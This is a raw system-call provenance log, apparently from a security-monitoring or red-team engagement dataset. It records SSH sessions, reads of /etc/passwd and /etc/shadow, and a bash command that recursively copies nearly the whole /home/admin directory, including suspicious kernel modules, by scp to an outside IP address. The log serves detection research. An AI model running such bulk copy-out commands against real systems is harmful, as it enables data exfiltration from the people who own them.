1558123880.934:1964323748,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123880.934:1964323708,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123880.934:1964323705,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123880.930:1964323680,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123880.930:1964323677,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123880.826:1964323453,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123880.826:1964323421,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123880.826:1964323420,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123880.730:1964323206,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123880.726:1964322950,1B04F14C-9F09-9213-D894-48011EDF0DB0:sshd,EXECUTE,AA9BFCD3-3AF5-2C3E-B029-1FAC17E5030A,sshd,null
1558123880.726:1964322929,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,1B04F14C-9F09-9213-D894-48011EDF0DB0,sshd,null
1558123878.578:1964317343,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.578:1964317279,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.574:1964317144,F1197848-9769-95A9-2878-74D5913FEE83:sshd,CHANGE_PRINCIPAL,4B5A29A7-E96B-1086-EF85-9D4D1AE71861,sshd,null
1558123878.574:1964317143,F1197848-9769-95A9-2878-74D5913FEE83:sshd,CHANGE_PRINCIPAL,F1197848-9769-95A9-2878-74D5913FEE83,sshd,null
1558123878.574:1964317142,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,CHANGE_PRINCIPAL,F1197848-9769-95A9-2878-74D5913FEE83,sshd,null
1558123878.294:1964312831,059742B0-00E4-B8A9-4AB8-DE12DDAADB9E:bash,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312748,CD864B61-5746-B6EB-2702-97343AAE052B:sshd,EXECUTE,059742B0-00E4-B8A9-4AB8-DE12DDAADB9E,bash,null
1558123878.290:1964312628,2A91224C-EF1A-E05C-E997-C51B03A5BE43:sshd,FORK,CD864B61-5746-B6EB-2702-97343AAE052B,sshd,null
1558123878.290:1964312577,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312571,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312551,F554E5D1-038D-92BF-EA85-B0B4DAA01CB8:sshd,CHANGE_PRINCIPAL,2A91224C-EF1A-E05C-E997-C51B03A5BE43,sshd,null
1558123878.290:1964312529,85BB08EF-64A5-3CEF-C763-BA6CB1656C1C:sshd,CHANGE_PRINCIPAL,F554E5D1-038D-92BF-EA85-B0B4DAA01CB8,sshd,null
1558123878.290:1964312526,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,FORK,85BB08EF-64A5-3CEF-C763-BA6CB1656C1C,sshd,null
1558123878.290:1964312517,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312480,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312477,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.290:1964312474,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.246:1964310405,63E5DB01-CBFD-3A17-170B-2591F6E2BE85:lsb_release,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.234:1964310165,72D3DBDA-46F6-9630-828F-C55F855B7F91:91-release-upgr,EXECUTE,63E5DB01-CBFD-3A17-170B-2591F6E2BE85,lsb_release,null
1558123878.234:1964310156,ED3F3407-2BF8-5C4D-D39B-D4F4A376A3EC:91-release-upgr,FORK,72D3DBDA-46F6-9630-828F-C55F855B7F91,91-release-upgr,null
1558123878.234:1964310149,DBDFF23B-C8B3-A038-DEC9-D3134D15C282:91-release-upgr,FORK,ED3F3407-2BF8-5C4D-D39B-D4F4A376A3EC,91-release-upgr,null
1558123878.234:1964310127,4447DFE7-3F0B-BB4D-4363-C26F8535280B:run-parts,EXECUTE,DBDFF23B-C8B3-A038-DEC9-D3134D15C282,91-release-upgr,null
1558123878.234:1964310126,7388B4E9-F02F-ADD3-7C51-A2425D8B566A:run-parts,FORK,4447DFE7-3F0B-BB4D-4363-C26F8535280B,run-parts,null
1558123878.074:1964301858,6A3D2949-E779-19A5-F4A1-D4767A512DF3:landscape-sysin,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.066:1964301453,F19F7A72-7B67-C76A-85BD-CE296FCA21F2:50-landscape-sy,EXECUTE,6A3D2949-E779-19A5-F4A1-D4767A512DF3,landscape-sysin,null
1558123878.066:1964301448,45134405-BC0C-BC14-1CDA-BC3B3643DD62:50-landscape-sy,FORK,F19F7A72-7B67-C76A-85BD-CE296FCA21F2,50-landscape-sy,null
1558123878.062:1964301191,6305675D-B9FB-74FD-BB43-7026C5EFDAE0:run-parts,EXECUTE,45134405-BC0C-BC14-1CDA-BC3B3643DD62,50-landscape-sy,null
1558123878.062:1964301185,7388B4E9-F02F-ADD3-7C51-A2425D8B566A:run-parts,FORK,6305675D-B9FB-74FD-BB43-7026C5EFDAE0,run-parts,null
1558123878.058:1964300876,A19A4DE1-345E-BBAD-C118-7D93DEBC52C0:env,EXECUTE,7388B4E9-F02F-ADD3-7C51-A2425D8B566A,run-parts,null
1558123878.058:1964300855,C1701E31-6FFD-26A4-AD65-FF774FCC60F8:sh,EXECUTE,A19A4DE1-345E-BBAD-C118-7D93DEBC52C0,env,null
1558123878.058:1964300838,3D2D516F-E5B2-6C6D-E879-407316E0AB91:sh,FORK,C1701E31-6FFD-26A4-AD65-FF774FCC60F8,sh,null
1558123878.058:1964300762,7C292C60-5DBC-058A-FEBA-2D28308EBCBD:sshd,EXECUTE,3D2D516F-E5B2-6C6D-E879-407316E0AB91,sh,null
1558123878.058:1964300742,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,FORK,7C292C60-5DBC-058A-FEBA-2D28308EBCBD,sshd,null
1558123878.058:1964300728,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.038:1964300377,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.038:1964300326,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.038:1964300314,6A4BEF22-2662-4165-6873-28E7B1A3C748:sshd,CHANGE_PRINCIPAL,4B5A29A7-E96B-1086-EF85-9D4D1AE71861,sshd,null
1558123878.038:1964300313,5B64D842-4B26-3E3F-FE8B-58E7D5B7C1C8:sshd,CHANGE_PRINCIPAL,6A4BEF22-2662-4165-6873-28E7B1A3C748,sshd,null
1558123878.038:1964300312,6A4BEF22-2662-4165-6873-28E7B1A3C748:sshd,CHANGE_PRINCIPAL,5B64D842-4B26-3E3F-FE8B-58E7D5B7C1C8,sshd,null
1558123878.038:1964300311,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,CHANGE_PRINCIPAL,6A4BEF22-2662-4165-6873-28E7B1A3C748,sshd,null
1558123878.038:1964300309,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.038:1964300295,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.038:1964300255,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123878.038:1964300252,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123878.030:1964300227,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123878.030:1964300224,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.926:1964300001,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.926:1964299969,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123877.926:1964299968,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123877.834:1964299753,4B5A29A7-E96B-1086-EF85-9D4D1AE71861:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.826:1964299497,A90C102E-764D-2D01-129B-9CEE4DC96B22:sshd,EXECUTE,4B5A29A7-E96B-1086-EF85-9D4D1AE71861,sshd,null
1558123877.826:1964299476,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,A90C102E-764D-2D01-129B-9CEE4DC96B22,sshd,null
1558123877.686:1964298947,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.686:1964298860,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.682:1964298784,028A51C8-EAC3-95BD-B813-11641FC3063A:sshd,CHANGE_PRINCIPAL,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E,sshd,null
1558123877.682:1964298783,028A51C8-EAC3-95BD-B813-11641FC3063A:sshd,CHANGE_PRINCIPAL,028A51C8-EAC3-95BD-B813-11641FC3063A,sshd,null
1558123877.682:1964298782,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,CHANGE_PRINCIPAL,028A51C8-EAC3-95BD-B813-11641FC3063A,sshd,null
1558123877.474:1964298592,D27448D3-6D48-AAA6-8EF3-ED943AF4517D:ls,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.470:1964298479,1F370BF3-B945-94ED-9BC5-A730910319E8:bash,EXECUTE,D27448D3-6D48-AAA6-8EF3-ED943AF4517D,b'ls --color=auto -la eraseme',null
1558123877.470:1964298473,9C29F653-B5EC-7921-ED7F-3D0C080C4967:bash,FORK,1F370BF3-B945-94ED-9BC5-A730910319E8,bash,null
1558123877.086:1964295416,9C29F653-B5EC-7921-ED7F-3D0C080C4967:bash,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.086:1964295333,1E804D9A-52D2-E4F9-2E11-12311EEF92F0:sshd,EXECUTE,9C29F653-B5EC-7921-ED7F-3D0C080C4967,bash,null
1558123877.086:1964295219,2FA4486D-CA47-55F4-9334-BD76F16A6F45:sshd,FORK,1E804D9A-52D2-E4F9-2E11-12311EEF92F0,sshd,null
1558123877.086:1964295168,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.086:1964295162,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.086:1964295142,DC7B38D3-3740-5189-BABD-B8BB49BFAE36:sshd,CHANGE_PRINCIPAL,2FA4486D-CA47-55F4-9334-BD76F16A6F45,sshd,null
1558123877.086:1964295120,DEB6FCF5-D6D0-D34B-A588-227174103331:sshd,CHANGE_PRINCIPAL,DC7B38D3-3740-5189-BABD-B8BB49BFAE36,sshd,null
1558123877.086:1964295117,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,FORK,DEB6FCF5-D6D0-D34B-A588-227174103331,sshd,null
1558123877.082:1964295108,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.082:1964295072,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.082:1964295069,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.082:1964295066,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.038:1964292998,8292F419-93D8-5E87-57FA-BB557F051416:lsb_release,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123877.030:1964292757,2BF3FBE1-FFFA-B77F-CBD8-DD649DF2CBF8:91-release-upgr,EXECUTE,8292F419-93D8-5E87-57FA-BB557F051416,lsb_release,null
1558123877.030:1964292748,443FE301-E2CC-5218-1FCA-B7A54AD77F2B:91-release-upgr,FORK,2BF3FBE1-FFFA-B77F-CBD8-DD649DF2CBF8,91-release-upgr,null
1558123877.030:1964292741,D22CC8C1-0C87-BF49-8A29-E5149087D3E3:91-release-upgr,FORK,443FE301-E2CC-5218-1FCA-B7A54AD77F2B,91-release-upgr,null
1558123877.026:1964292719,31E5FD4E-7BE8-192E-16AA-1BAB6B4BE674:run-parts,EXECUTE,D22CC8C1-0C87-BF49-8A29-E5149087D3E3,91-release-upgr,null
1558123877.026:1964292718,E9A9218B-BF41-2F03-1CA3-36AF0A269E5A:run-parts,FORK,31E5FD4E-7BE8-192E-16AA-1BAB6B4BE674,run-parts,null
1558123876.822:1964284420,162B62F7-C9EA-F04B-5318-01C40C203774:landscape-sysin,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.814:1964284063,234313A8-C8D3-088A-2688-ECEE3ADA816B:50-landscape-sy,EXECUTE,162B62F7-C9EA-F04B-5318-01C40C203774,landscape-sysin,null
1558123876.814:1964284058,2ED8CFDE-7637-3A4F-626A-3C110DD59E84:50-landscape-sy,FORK,234313A8-C8D3-088A-2688-ECEE3ADA816B,50-landscape-sy,null
1558123876.810:1964283795,A426E1E4-8BF7-EFE4-E672-32F765D0223C:run-parts,EXECUTE,2ED8CFDE-7637-3A4F-626A-3C110DD59E84,50-landscape-sy,null
1558123876.810:1964283793,E9A9218B-BF41-2F03-1CA3-36AF0A269E5A:run-parts,FORK,A426E1E4-8BF7-EFE4-E672-32F765D0223C,run-parts,null
1558123876.806:1964283498,5A260848-BC1C-B2E1-472C-B75473A3F879:env,EXECUTE,E9A9218B-BF41-2F03-1CA3-36AF0A269E5A,run-parts,null
1558123876.806:1964283469,D174D207-212F-F196-1FDA-7892D2C5BCCB:sh,EXECUTE,5A260848-BC1C-B2E1-472C-B75473A3F879,env,null
1558123876.806:1964283462,F53F272D-6D21-43E8-7308-C10C1FFC9E8D:sh,FORK,D174D207-212F-F196-1FDA-7892D2C5BCCB,sh,null
1558123876.806:1964283420,094A27F4-8241-195F-EB66-8B56A934BB3C:sshd,EXECUTE,F53F272D-6D21-43E8-7308-C10C1FFC9E8D,sh,null
1558123876.806:1964283411,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,FORK,094A27F4-8241-195F-EB66-8B56A934BB3C,sshd,null
1558123876.806:1964283408,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.758:1964283074,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.758:1964283023,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.758:1964283011,1A17B031-7B62-9885-DAA4-20FA672CD000:sshd,CHANGE_PRINCIPAL,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E,sshd,null
1558123876.758:1964283010,7DC8BF89-B4F1-ED0D-5DD0-870F70F9FAC5:sshd,CHANGE_PRINCIPAL,1A17B031-7B62-9885-DAA4-20FA672CD000,sshd,null
1558123876.758:1964283009,1A17B031-7B62-9885-DAA4-20FA672CD000:sshd,CHANGE_PRINCIPAL,7DC8BF89-B4F1-ED0D-5DD0-870F70F9FAC5,sshd,null
1558123876.758:1964283008,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,CHANGE_PRINCIPAL,1A17B031-7B62-9885-DAA4-20FA672CD000,sshd,null
1558123876.758:1964283006,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.758:1964282992,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.758:1964282951,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123876.758:1964282948,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.750:1964282921,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1558123876.750:1964282918,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.646:1964281991,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.646:1964281959,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123876.646:1964281958,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1558123876.550:1964281744,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123876.546:1964281488,A77F91ED-78C3-1AAE-247A-FE4E19A1FBD5:sshd,EXECUTE,049C7803-B3E7-FD59-D5FE-3A9DD9C40B5E,sshd,null
1558123876.546:1964281467,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,A77F91ED-78C3-1AAE-247A-FE4E19A1FBD5,sshd,null
1558123871.394:1964277028,AA676BD7-F177-CA6C-CA8B-88501B9FF4B0:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123871.394:1964276947,AA676BD7-F177-CA6C-CA8B-88501B9FF4B0:sshd,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123871.394:1964276871,481ED918-1BBB-9D11-A06D-B5EE0E324B45:sshd,CHANGE_PRINCIPAL,AA676BD7-F177-CA6C-CA8B-88501B9FF4B0,sshd,null
1558123871.394:1964276870,481ED918-1BBB-9D11-A06D-B5EE0E324B45:sshd,CHANGE_PRINCIPAL,481ED918-1BBB-9D11-A06D-B5EE0E324B45,sshd,null
1558123871.394:1964276869,AA676BD7-F177-CA6C-CA8B-88501B9FF4B0:sshd,CHANGE_PRINCIPAL,481ED918-1BBB-9D11-A06D-B5EE0E324B45,sshd,null
1558123869.266:1964273462,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273459,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273456,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273453,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273450,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273447,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.266:1964273444,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.262:1964273422,E863E105-AD54-8D31-B9C6-4CFFE446B2DD:ssh,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.258:1964273327,E12F5921-B943-74A2-3282-9B85B4AFEB4D:scp,EXECUTE,E863E105-AD54-8D31-B9C6-4CFFE446B2DD,ssh,null
1558123869.254:1964273318,B9B5D737-7BAE-6449-95E1-78543858D33F:scp,FORK,E12F5921-B943-74A2-3282-9B85B4AFEB4D,scp,null
1558123869.254:1964273311,B9B5D737-7BAE-6449-95E1-78543858D33F:scp,MMAP,474423BC-19C4-61C0-4C41-525A9A991530,/etc/passwd,null
1558123869.254:1964273250,C0EE6962-4191-C7AE-AF3C-4DAFA6241A3C:bash,EXECUTE,B9B5D737-7BAE-6449-95E1-78543858D33F,b'scp -r /home/admin/acrylic /home/admin/adjuncts /home/admin/aethogen /home/admin/airbrush /home/admin/allayers /home/admin/allround /home/admin/anconeus /home/admin/ancylostomiasis /home/admin/antilepton /home/admin/antisepticize /home/admin/aponeurotomy /home/admin/autocombustible /home/admin/aviarists /home/admin/backup /home/admin/bandagers /home/admin/barong /home/admin/bedlamised /home/admin/bombacaceous /home/admin/botulinuses /home/admin/boult /home/admin/brewer /home/admin/broider /home/admin/bushidos /home/admin/celebe /home/admin/chelicere /home/admin/chondropharyngeus /home/admin/cicalas /home/admin/cilices /home/admin/collyr /home/admin/composita /home/admin/convincible /home/admin/convulsedly /home/admin/copintank /home/admin/critters /home/admin/croakers /home/admin/cyanogenesis /home/admin/dealers /home/admin/decimator /home/admin/depardieu /home/admin/deposes /home/admin/deracialize /home/admin/dermobranchia /home/admin/Desktop /home/admin/desuete /home/admin/directeur /home/admin/disincrustion /home/admin/disobligation /home/admin/docs /home/admin/Documents /home/admin/dogma /home/admin/Downloads /home/admin/drumming /home/admin/dunny /home/admin/educt /home/admin/electrovection /home/admin/empiricism /home/admin/energeticalness /home/admin/eversible /home/admin/exacuate /home/admin/farandmen /home/admin/files /home/admin/finnick /home/admin/flashpan /home/admin/fleabanes /home/admin/genesiacal /home/admin/geoponical /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/grooper /home/admin/haemophilic /home/admin/halleflinta /home/admin/hauntingly /home/admin/hemophthalmia /home/admin/herpetologist /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/imposted /home/admin/imposthume /home/admin/individua /home/admin/interrogatedness /home/admin/jna-95354950 /home/admin/jockeydom /home/admin/joinable /home/admin/lewisite /home/admin/liverheartedness /home/admin/load_helper.ko /home/admin/machine /home/admin/__MACOSX /home/admin/medicamentary /home/admin/merfold /home/admin/merogenetic /home/admin/messmen /home/admin/metanitrophenol /home/admin/methene /home/admin/mignon /home/admin/minion /home/admin/misconducting /home/admin/misinters /home/admin/molligrant /home/admin/moondown /home/admin/Music /home/admin/navaids /home/admin/neurologically /home/admin/nitidulid /home/admin/nocktat /home/admin/nodeexporter /home/admin/noncrossover /home/admin/noncuratively /home/admin/nonrecombinant /home/admin/nonshatter /home/admin/olivil /home/admin/osphere /home/admin/otarian /home/admin/out10 /home/admin/out20 /home/admin/out249 /home/admin/out250 /home/admin/out514 /home/admin/out559 /home/admin/out669 /home/admin/out680 /home/admin/out724 /home/admin/out850 /home/admin/out857 /home/admin/out864 /home/admin/out888 /home/admin/out892 /home/admin/out912 /home/admin/overskirt /home/admin/overspender /home/admin/overwinning /home/admin/palestine /home/admin/panada /home/admin/parochialization /home/admin/passwd /home/admin/phyllostomatidae /home/admin/Pictures /home/admin/pisgah /home/admin/placement /home/admin/planospore /home/admin/polytype /home/admin/potholes /home/admin/precopy /home/admin/preexception /home/admin/preoccupiedness /home/admin/preppie /home/admin/prereceiver /home/admin/preserver /home/admin/pricklyback /home/admin/projections /home/admin/proterandry /home/admin/psychomoral /home/admin/Public /home/admin/pulpwoods /home/admin/pumpkinish /home/admin/quislings /home/admin/ratement /home/admin/ravi /home/admin/read_scan.ko /home/admin/referendaryship /home/admin/rerival /home/admin/restorationist /home/admin/rove /home/admin/saccharide /home/admin/sapropel /home/admin/sarcoma /home/admin/satable /home/admin/savoring /home/admin/sclerosed /home/admin/semifamine /home/admin/sequentially /home/admin/sfree /home/admin/sheaths /home/admin/sigatoka /home/admin/skiffles /home/admin/spathyema /home/admin/speirs /home/admin/spiky /home/admin/spirae /home/admin/stairbuilding /home/admin/stringsman /home/admin/subcircularity /home/admin/subimbricative /home/admin/superapologies /home/admin/supposital /home/admin/suppressants /home/admin/swiples /home/admin/tabors /home/admin/talonid /home/admin/Templates /home/admin/tennantite /home/admin/test /home/admin/tinkler /home/admin/tormentor /home/admin/tortiously /home/admin/touchless /home/admin/trachile /home/admin/trainload /home/admin/treckpot /home/admin/trillil /home/admin/tripleness /home/admin/ubuntu_pkgs /home/admin/ubuntu_pkgs.zip /home/admin/unadoptably /home/admin/undeteriorated /home/admin/unempty /home/admin/unfoughten /home/admin/unify /home/admin/uniseriately /home/admin/unloosen /home/admin/unmentioned /home/admin/unrecreational /home/admin/unsickered /home/admin/untempting /home/admin/Videos /home/admin/vilified /home/admin/vitrean /home/admin/woolsack /home/admin/work /home/admin/wurtzilite /home/admin/xvnc4viewer.deb /home/admin/yentas /home/admin/yett admin@128.55.12.124:\\C:WindowsTemp',null
